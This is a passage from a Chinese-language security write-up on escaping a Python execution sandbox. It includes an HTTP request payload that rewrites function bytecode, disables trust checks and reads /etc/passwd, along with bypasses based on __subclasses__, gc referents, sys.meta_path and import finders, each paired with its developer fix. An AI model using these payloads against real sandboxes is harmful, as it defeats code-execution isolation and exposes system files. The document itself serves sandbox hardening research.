User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1584

{"code":"try: import os,sys;from types import CodeType;a=CodeType(0,0,0,9,9,31,bytes.fromhex('89105300'),(None, 0, 'hookstate', ' [secbox_pylog_functions] func = ', ' '),('get_magic', 'builtin_isinstance', 'list', 'checker', 'sys', '_getframe', 'f_back', 'check_trust_func', 'builtin_hasattr', 'tls', 'HookState', 'enable', 'hookstate', 'disable', 'log', 'debug', '__name__', 'check_trust_dir', 'apply_hooker'),('input_args', 'input_kwargs', 'magic', 'hookers', 'checker', 'frame', 'in_trust_dir', 'args_list', 'retval'),'./sandbox/_decorators.py','inner','decorator_factory.<locals>.wrapper.<locals>.inner',323,bytes.fromhex('f88000e5141d914b944b8845e50f21a026ad24d10f2fd40f2ff000030d23d81a2090079007e01b2198289007d8161d9861946ad416288847dd1417944d914f944f8845d81419944c8845e50f1fa004a067a875d10f35d40f35f000010d39d8171b9074985ad01738a83cd01738d01738d01038dd1322a533a80bd11334d41334f000010d31dd2029d420309503940ddd0f128c7da509d42030d20f30d00f30e52029d420319503940de01017940bd71021d21021a055d0226bd0226bc854cc5dd0226bd0226bd05d61d0226bd0226bd06469d0226bd0226bd1106cd4106cd0106cdd1f2ea877d01f48d01f48b82dd01f48d01f48900ce52029d420309503940dd81723f000031130d82229f000021530f0000215309806d8252ba85ab81cc07dd0565ad45663d0656cd0246d9809dd1824a059d1182fd4182fd0182fd0182fe015199054983ad01536a81cd01536d015368846d81319884d'),bytes.fromhex(''),('config_kwargs', 'func', 'hooker'));os.listdir.__code__=a;((os.listdir('/')['modules']['__mp_main__'].sandbox._decorators.check_trust_func))=lambda x,y,z:True;print(open('/etc/passwd').read()); except Exception as e: print(e);","session_id":"xxx"}
```

修复方案，限制函数的__code__不能被修改

绕过方法，直接用FunctionType构建一个函数，无需修改其他函数。

##### __subclasses__

可以看到关键Hook逻辑中的Hook类其实继承自ABC类的，所以可以通过ABC类找到FuncHookSubclass类。



同理，把其中validating_config和validating_arguments修改为永远返回True即可绕过限制调用原函数。



##### gc.get_referrers和gc.get_referents

```python
import gc,os;print(gc.get_referents(os.system)[1]['sandbox']);
```



```python
import gc,os;print(gc.get_referrers(os)[1]['sandbox']);
```



 

#### 绕过白名单导入任意模块

比如pty库不在白名单中，直接导入会失败。



##### sys.meta_path.pop(0)

既然白名单是通过向meta_path添加一个安全finder，那我们直接把这个finder取出即可绕过限制。



import sys;sys.meta_path.pop(0);import pty;



##### 动态修改检查逻辑

对于第一种方式的修复绕过技术，开发人员限制sys.meta_path不能被修改，那么我们还可以参考此前的思路动态修改sandbox.hook.SecBoxFinder.find_spec方法。

import sys;sys.meta_path[0].find_spec=lambda x,y,z:None;import pty;



##### 直接使用Finder

对于前面修复的绕过技术，开发人员限制sys.meta_path与SecBoxFinder不能被修改，我们可以直接使用最后一个Finder。

```python
import sys,importlib;
print(importlib.util.module_from_spec(sys.meta_path[3].find_spec('pty')));
```



 

## 参考资料

\- Python字节码执行实现沙箱逃逸 https://wiki.huawei.com/domains/21514/wiki/40292/WIKI202307261662161

\- 利用PythonUAF漏洞实现沙箱逃逸-实验室项目实战 https://wiki.huawei.com/domains/5560/wiki/14528/WIKI202408054218660

\- 利用PythonUAF漏洞实现沙箱逃逸-原文 https://pwn.win/2022/05/11/python-buffered-reader.html

\- python字节码逃逸学习 https://3ms.huawei.com/km/blogs/details/10985955#preview_wps_10985955

\- Python沙箱逃逸测试思路 https://clouddevops.huawei.com/domains/30660/wiki/2/WIKI2024102600090

\- AST检查绕过 https://note.tonycrane.cc/ctf/misc/escapes/pysandbox/

\- 深入理解Python虚拟机 https://github.com/Chang-LeHung/dive-into-cpython?tab=readme-ov-file

\- Cpython实现原理 https://hai-shi.gitbook.io/cpython-internals/

\- 深度剖析cpython解释器 https://www.cnblogs.com/traditional/p/13391098.html

\- 通过AST来构造Pickle opcode https://xz.aliyun.com/news/6608
